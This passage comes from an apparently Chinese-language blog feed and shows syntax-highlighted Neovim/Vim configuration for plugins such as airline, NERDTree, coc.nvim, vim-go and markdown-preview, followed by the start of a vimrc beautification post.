class="comment">&quot; ==状态模式简洁显示==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_mode_map</span> = &#123;</span><br><span class="line">      \ <span class="string">&#x27;__&#x27;</span>     : <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;c&#x27;</span>      : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;i&#x27;</span>      : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ic&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ix&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;n&#x27;</span>      : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;multi&#x27;</span>  : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ni&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;no&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;R&#x27;</span>      : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;Rv&#x27;</span>     : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;s&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;S&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;t&#x27;</span>      : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;v&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;V&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===配色方案===</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c1 :<span class="keyword">set</span> background=dark<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> solarized8<span class="symbol">&lt;CR&gt;</span>:AirlineTheme jellybeans<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot;配色1</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c2 :<span class="keyword">set</span> background=light<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">let</span> ayucolor=<span class="string">&#x27;light&#x27;</span><span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> ayu<span class="symbol">&lt;CR&gt;</span>:AirlineTheme ayu_light<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 配色2</span></span><br><span class="line"><span class="keyword">set</span> termguicolors	<span class="comment">&quot;开启真彩支持</span></span><br><span class="line"><span class="keyword">set</span> background=dark</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:solarized_termtrans</span>=<span class="number">1</span>	<span class="comment">&quot; 透明背景</span></span><br><span class="line"><span class="comment">&quot;colorscheme solarized8</span></span><br><span class="line"><span class="string">&quot;let ayucolor=&#x27;light&#x27;	&quot;</span> light mirage dark</span><br><span class="line"><span class="comment">&quot;colorscheme ayu</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===目录树===</span></span><br><span class="line"><span class="comment">&quot; ==NERDTreeToggle==</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F3&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 设置目录树快捷键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==NERDTree-git提示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeIndicatorMapCustom</span> = &#123;</span><br><span class="line">    \ <span class="string">&quot;Modified&quot;</span>  : <span class="string">&quot;✹&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Staged&quot;</span>    : <span class="string">&quot;✚&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Untracked&quot;</span> : <span class="string">&quot;✭&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Renamed&quot;</span>   : <span class="string">&quot;➜&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unmerged&quot;</span>  : <span class="string">&quot;═&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Deleted&quot;</span>   : <span class="string">&quot;✖&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Dirty&quot;</span>     : <span class="string">&quot;✗&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Clean&quot;</span>     : <span class="string">&quot;✔︎&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unknown&quot;</span>   : <span class="string">&quot;?&quot;</span></span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==大规模项目文件浏览==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;C-p&gt;</span> :CtrlP<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ctrlp_prompt_mappings</span> = &#123;</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;j&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-e&gt;&#x27;</span>, <span class="string">&#x27;&lt;down&gt;&#x27;</span>],</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;k&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-u&gt;&#x27;</span>, <span class="string">&#x27;&lt;up&gt;&#x27;</span>],</span><br><span class="line">  \ &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===自动化===</span></span><br><span class="line"><span class="comment">&quot; ==coc配置==</span></span><br><span class="line"><span class="comment">&quot; 查看：https://github.com/neoclide/coc.nvim 中Extensions的列表</span></span><br><span class="line"><span class="comment">&quot; 执行命令安装coc对相应语言的补全</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 若表中没有需要的，可参考 &quot;</span>Register custom <span class="keyword">language</span> servers<span class="comment">&quot; 进行配置</span></span><br><span class="line"><span class="comment">&quot; 参考教程：https://www.jianshu.com/p/231bfb066051</span></span><br><span class="line"><span class="keyword">set</span> timeoutlen=<span class="number">500</span> 		<span class="comment">&quot; 设置按键超时为</span></span><br><span class="line"><span class="keyword">set</span> cmdheight=<span class="number">2</span> 		<span class="comment">&quot; 设置命令行行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-d&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-t&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-d&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-t&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> updatetime=<span class="number">1000</span></span><br><span class="line"><span class="keyword">set</span> shortmess+=<span class="keyword">c</span></span><br><span class="line"><span class="keyword">set</span> signcolumn=yes</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;TAB&gt;</span></span><br><span class="line">      \ <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-n&gt;&quot;</span> :</span><br><span class="line">      \ <span class="symbol">&lt;SID&gt;</span>check_back_space() ? <span class="string">&quot;\&lt;TAB&gt;&quot;</span> :</span><br><span class="line">      \ coc#refresh()</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span><span class="symbol">&lt;S-TAB&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-p&gt;&quot;</span> : <span class="string">&quot;\&lt;C-h&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">check_back_space</span><span class="params">()</span> <span class="title">abort</span></span></span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">col</span> = <span class="keyword">col</span>(<span class="string">&#x27;.&#x27;</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> !col || <span class="built_in">getline</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="keyword">col</span> - <span class="number">1</span>]  =~# <span class="string">&#x27;\s&#x27;</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"><span class="comment">&quot; 使用&lt;cr&gt;确认完成，`&lt;C-g&gt; u`表示在当前位置断开撤销链</span></span><br><span class="line"><span class="comment">&quot; Coc仅在确认时执行片段和其他编辑</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;cr&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="comment">&quot; 使用K在预览窗口中显示文档</span></span><br><span class="line"><span class="keyword">nnoremap</span> ? :<span class="keyword">call</span> <span class="symbol">&lt;SID&gt;</span>show_documentation()<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">show_documentation</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">index</span>([<span class="string">&#x27;vim&#x27;</span>,<span class="string">&#x27;help&#x27;</span>], &amp;<span class="keyword">filetype</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">execute</span> <span class="string">&#x27;h &#x27;</span>.<span class="built_in">expand</span>(<span class="string">&#x27;&lt;cword&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">call</span> CocAction(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 突出显示CursorHold上光标下的符号</span></span><br><span class="line"><span class="keyword">autocmd</span> CursorHold * <span class="keyword">silent</span> <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===历史===</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:undotree_DiffAutoOpen</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> :UndotreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===文本===</span></span><br><span class="line"><span class="comment">&quot; ==过滤对齐工具==</span></span><br><span class="line"><span class="comment">&quot;使用 :Tabularize /|	使文本向 | 对齐,可是其他符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==快速选中==</span></span><br><span class="line"><span class="string">&quot;视图模式下，使用 i&#x27; 快速选中 &#x27;&#x27; 中的内容，其他: i&quot;</span> i) i] i&#125; ip</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==快速注释==</span></span><br><span class="line"><span class="comment">&quot;输入 &lt;space&gt;cc 对该行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===vim-go===</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_def_mapping_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_template_autocreate</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_textobj_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_auto_type_info</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_def_mapping_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_array_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_build_constraints</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_chan_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_extra_types</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_fields</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_format_strings</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_function_calls</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_function_parameters</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_functions</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_generate_tags</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_methods</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_operators</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_space_tab_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_string_spellcheck</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_structs</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_trailing_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_types</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_variable_assignments</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_variable_declarations</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===vim-markdown-toc===</span></span><br><span class="line"><span class="comment">&quot;let g:vmt_auto_update_on_save = 0</span></span><br><span class="line"><span class="comment">&quot;let g:vmt_dont_insert_fence = 1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_cycle_list_item_markers</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_fence_text</span> = <span class="string">&#x27;TOC&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_fence_closing_text</span> = <span class="string">&#x27;/TOC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Bullets.vim===</span></span><br><span class="line"><span class="comment">&quot;let g:bullets_set_mappings = 0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:bullets_enabled_file_types</span> = [</span><br><span class="line">			\ <span class="string">&#x27;markdown&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;gitcommit&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;scratch&#x27;</span></span><br><span class="line">			\]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Markdon===</span></span><br><span class="line"><span class="comment">&quot; ==MarkdownPreview配置==</span></span><br><span class="line"><span class="comment">&quot; 设置为1，nvim将在进入降价缓冲区后打开预览窗口,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_start</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，当从降价缓冲区转换到另一个缓冲区时，nvim将自动关闭当前预览窗口,默认1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_close</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1时，vim将在保存缓冲区时刷新markdown或从插入模式退出，默认0为自动刷新markdown，因为您编辑或移动光标,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_refresh_slow</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，MarkdownPreview命令可用于所有文件，默认情况下可用于markdown文件,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_command_for_global</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，默认情况下预览服务器可供网络中的其他人使用，服务器侦听localhost（127.0.0.1,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_to_the_world</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 当您在远程vim中工作并在本地浏览器上预览时，使用自定义IP打开预览页面非常有用。详细信息请参阅:https://github.com/iamcco/markdown-preview.nvim/pull/9,默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_ip</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 指定浏览器打开预览页面，默认：&#x27;&#x27;,firefox浏览器快熟关闭窗口需要设置：</span></span><br><span class="line"><span class="comment">&quot; about:config &gt; dom.allow_scripts_to_close_windows 将值设置为 true</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browser</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，打开预览页面时，在命令行中回显预览页面url，默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_echo_preview_url</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 自定义vim函数名称打开预览页面此函数将接收url作为param，默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browserfunc</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; markdown渲染选项</span></span><br><span class="line"><span class="comment">&quot; mkit: markdown-it选项</span></span><br><span class="line"><span class="comment">&quot; katex: katex选项</span></span><br><span class="line"><span class="comment">&quot; uml: markdown-it-plantuml选项</span></span><br><span class="line"><span class="comment">&quot; maid: mermaid选项</span></span><br><span class="line"><span class="comment">&quot; disable_sync_scroll: 禁用同步滚动，默认0</span></span><br><span class="line"><span class="comment">&quot; sync_scroll_type: &#x27;middle&#x27;, &#x27;top&#x27; or &#x27;relative&#x27;, default value is &#x27;middle&#x27;</span></span><br><span class="line"><span class="comment">&quot;   middle: 表示光标位置总是显示在预览页面的中间</span></span><br><span class="line"><span class="comment">&quot;   top: 表示预览页面顶部的vim顶部视口总是显示</span></span><br><span class="line"><span class="comment">&quot;   relative: 表示光标位置总是显示在预览页面的相对位置</span></span><br><span class="line"><span class="comment">&quot; hide_yaml_meta: 隐藏yaml元数据，默认1</span></span><br><span class="line"><span class="comment">&quot; sequence_diagrams: js-sequence-diagrams 选项</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_preview_options</span> = &#123;</span><br><span class="line">    \ <span class="string">&#x27;mkit&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;katex&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;uml&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;maid&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;disable_sync_scroll&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    \ <span class="string">&#x27;sync_scroll_type&#x27;</span>: <span class="string">&#x27;middle&#x27;</span>,</span><br><span class="line">    \ <span class="string">&#x27;hide_yaml_meta&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    \ <span class="string">&#x27;sequence_diagrams&#x27;</span>: &#123;&#125;</span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义markdown样式必须是绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_markdown_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义高亮样式必须绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_highlight_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义端口启动服务器或使用随机空白</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_port</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 预览页面标题，$ &#123;name&#125;将替换为文件名</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_page_title</span> = <span class="string">&#x27;「$&#123;name&#125;」&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F8&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreview</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F9&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewStop</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;LEADER&gt;</span>mt <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewToggle</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==表格制作工具==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">tm</span> :TableModeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===fzf-gitignore===</span></span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span>gi :FzfGitignore<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===其他===</span></span><br><span class="line"><span class="comment">&quot; ==中文帮组==</span></span><br><span class="line"><span class="string">&quot;set helplang=cn		&quot;</span> 启用英文的为<span class="keyword">en</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==显示按键绑定==</span></span><br><span class="line"><span class="comment">&quot;nnoremap &lt;silent&gt; &lt;leader&gt; :WhichKey &#x27;&lt;Space&gt;&#x27;&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NeoVim</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>NeoVim</tag>
      </tags>
  </entry>
  <entry>
    <title>vim美化</title>
    <url>/2019/08/08/vim%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h1 id="vim-自带教程"><a href="#vim-自带教程" class="headerlink" title="vim 自带教程"></a>vim 自带教程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vimtutor</span><br></pre></td></tr></table></figure>
<h1 id="vim-配置美化"><a href="#vim-配置美化" class="headerlink" title="vim 配置美化"></a>vim 配置美化</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vim/vimrc	<span class="comment">#创建自己的vim配置</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____   __     _____ __  __ ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  \ \   / /_ _|  \/  |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \   \ \ / / | || |\/| | |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) |   \ V /  | || |  | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/     \_/  |___|_|  |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot; ===============================木He寸&amp;eonun===============================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; i 写入模式、i插入之前、I行首插入、a插入之后、A行尾插入、o下行插入、O上行插入、x 删除光标后一个字符</span></span><br><span class="line"><span class="comment">&quot; &lt;Operation(操作)&gt; &lt;Motion(动作)&gt;</span></span><br><span class="line"><span class="comment">&quot; d 剪切操作(剪切可看做删除), y 复制操作, p 粘贴操作， c 剪切后修改操作</span></span><br><span class="line"><span class="comment">&quot; ← 左动作， → 右动作， 3← 3个左动作， b 选择光标开启到上一个词后的内容， i 指明光标在词中，当前词待操作， w 选择光标开始到下个词前的内容， iw 在当前词之间选择该， y3← 向右复制， f 查找动作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 文件类型检测</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 开启语法高亮</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&quot;g:syntax_on&quot;</span>)</span><br><span class="line">    <span class="keyword">syntax</span> enable</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 保存vimrc时立即重新加载生效</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWritePost $MYVIMRC <span class="keyword">source</span> $MYVIMRC	</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; txt文件按照wiki语法高亮</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *.txt <span class="keyword">set</span> ft=confluencewiki </span><br><span class="line"><span class="keyword">autocmd</span> BufEnter *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 恢复上次文件打开位置</span></span><br><span class="line"><span class="keyword">au</span> BufReadPost * <span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; <span class="number">0</span>|<span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= <span class="built_in">line</span>(<span class="string">&quot;$&quot;</span>)|<span class="keyword">exe</span>(<span class="string">&quot;norm &#x27;\&quot;&quot;</span>)|<span class="keyword">else</span>|<span class="keyword">exe</span> <span class="string">&quot;norm $&quot;</span>|<span class="keyword">endif</span>|<span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开时运行指令 取消上回搜索内容的高亮</span></span><br><span class="line">exec <span class="string">&quot;nohlsearch&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"><span class="comment">&quot;===Let===</span></span><br><span class="line"><span class="comment">&quot;==START==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 将leader键（\键,类似于Windows键）换成空格（相当于空格键）</span></span><br><span class="line"><span class="keyword">let</span> mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="comment">&quot; 矫正部分配色</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_ut=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 不同模式下的光标样式</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=1\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SR = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=2\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_EI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=0\x7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===END===</span></span><br><span class="line"><span class="comment">&quot;===let===</span></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"><span class="comment">&quot;===set===</span></span><br><span class="line"><span class="comment">&quot;==START==</span></span><br><span class="line"><span class="keyword">set</span> nocompatible		<span class="comment">&quot; 不兼容 VI ,compatible为兼容(tab将不会变成空格)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fileencodings=utf-<span class="number">8</span>,gbk	<span class="comment">&quot; 写入文件时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> termencoding=utf-<span class="number">8</span>		<span class="comment">&quot; 